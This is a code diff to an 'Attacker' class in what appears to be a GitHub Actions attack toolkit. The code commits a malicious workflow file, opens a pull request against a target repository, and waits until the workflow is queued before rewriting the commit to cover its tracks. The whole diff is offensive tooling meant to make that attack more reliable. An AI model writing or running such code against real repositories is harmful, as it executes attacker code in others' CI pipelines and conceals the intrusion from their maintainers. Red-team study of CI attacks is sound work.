@@ -164,12 +164,12 @@ class Attacker:
                     payload, workflow_name=workflow_name
                 )
 
-            status = cloned_repo.commit_file(
+            commit_hash = cloned_repo.commit_file(
                 yaml_contents.encode(),
                 f".github/workflows/{yaml_name}.yml",
                 message=commit_message
             )
-            if not status:
+            if not commit_hash:
                 Output.error("Failed to commit the malicious workflow locally!")
                 return False
 
@@ -193,6 +193,21 @@ class Attacker:
                     "Successfully created a PR! It can be viewed at: "
                     f"{Output.bright(pr_url)}"
                 )
+
+                # Ensure workflow is queued before closing PR
+                for i in range(self.timeout):
+                    workflow_id = self.api.get_recent_workflow(
+                        target_repo, commit_hash)
+                    if workflow_id == -1:
+                        Output.error("Failed to find the created workflow!")
+                        return
+                    elif workflow_id > 0:
+                        break
+                    else:
+                        time.sleep(1)
+                else:
+                    Output.error("Failed to find the created workflow!")
+                    return
 
                 rebase_status = cloned_repo.rewrite_commit()
 
